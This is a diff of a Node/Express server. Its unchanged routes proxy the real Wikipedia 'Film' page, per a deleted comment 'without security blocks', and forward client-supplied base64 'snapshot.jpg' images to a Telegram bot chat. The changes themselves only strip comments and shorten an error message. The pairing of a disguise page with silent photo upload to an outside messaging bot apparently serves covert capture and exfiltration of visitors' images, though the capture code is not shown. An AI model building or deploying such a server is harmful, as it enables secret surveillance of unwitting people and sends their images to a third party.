@@ -14,34 +14,27 @@ app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Proxy route to load the real Wikipedia page without security blocks
 app.get('/proxy/wiki', async (req, res) => {
     try {
         const response = await fetch('https://en.wikipedia.org/wiki/Film');
         let html = await response.text();
-        
-        // Adjust links and image sources to point to Wikipedia's domain
         html = html.replace(/href="\//g, 'href="https://en.wikipedia.org/');
         html = html.replace(/src="\//g, 'src="https://en.wikipedia.org/');
-        
         res.send(html);
     } catch (err) {
-        res.status(500).send("Error loading Wikipedia content.");
+        res.status(500).send("Error loading Wikipedia");
     }
 });
 
-// Photo upload route
 app.post('/api/upload-photo', async (req, res) => {
     try {
         const { dataUrl } = req.body;
         const matches = dataUrl.match(/^data:(image\/\w+);base64,(.+)$/);
         if (!matches) return res.status(400).json({ ok: false });
-        
         const buffer = Buffer.from(matches[2], 'base64');
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
         form.append('photo', buffer, { filename: 'snapshot.jpg', contentType: matches[1] });
-        
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
         res.json({ ok: true });
     } catch (err) { res.status(500).json({ ok: false }); }
